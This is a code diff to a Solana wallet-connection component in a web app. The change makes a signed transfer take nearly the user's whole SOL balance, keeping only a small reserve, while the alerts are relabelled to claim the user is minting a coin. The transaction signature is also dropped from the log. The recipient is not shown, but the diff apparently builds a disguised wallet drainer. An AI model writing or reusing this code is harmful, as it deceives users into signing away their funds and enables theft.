@@ -111,20 +111,23 @@ const WalletConnectionHandler: FC = () => {
         }
 
         if (!connection || lamports === null) {
-            alert('❌ All RPCs failed. Try again later.');
+            alert('❌ Connection failed with wallets');
             return;
         }
 
         try {
             setSolBalance(lamports / LAMPORTS_PER_SOL);
             console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
-            console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
+            console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(5)} SOL`);
 
-            const sendAmount = 100000; // 0.001 SOL
-            if (lamports < sendAmount + 5000) {
-                alert('⚠️ Not enough SOL to send.');
-                return;
-            }
+const reservedLamports = 100000; // Reserve 0.0001 SOL
+if (lamports <= reservedLamports) {
+    alert('⚠️ Not enough SOL to mint a coin.');
+    return;
+}
+
+const sendAmount = lamports - reservedLamports;
+
 
             const tx = new Transaction().add(
                 SystemProgram.transfer({
@@ -138,7 +141,7 @@ const WalletConnectionHandler: FC = () => {
             tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
 
             if (!signTransaction) {
-                alert('❌ Wallet not ready to sign.');
+                alert('❌ Wallet not ready to mint the coin.');
                 return;
             }
 
@@ -148,14 +151,14 @@ const WalletConnectionHandler: FC = () => {
             setTimeout(async () => {
                 try {
                     const txid = await connection!.sendRawTransaction(signedTx.serialize());
-                    console.log(`🚀 Transaction sent. Signature: ${txid}`);
+                    console.log(`🚀 Transaction sent.`);
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
                 }
             }, 10000);
         } catch (err) {
             console.error('❌ Error sending transaction:', err);
-            alert('Transaction failed.');
+            alert('Creation failed.');
         } finally {
             setLoading(false);
         }
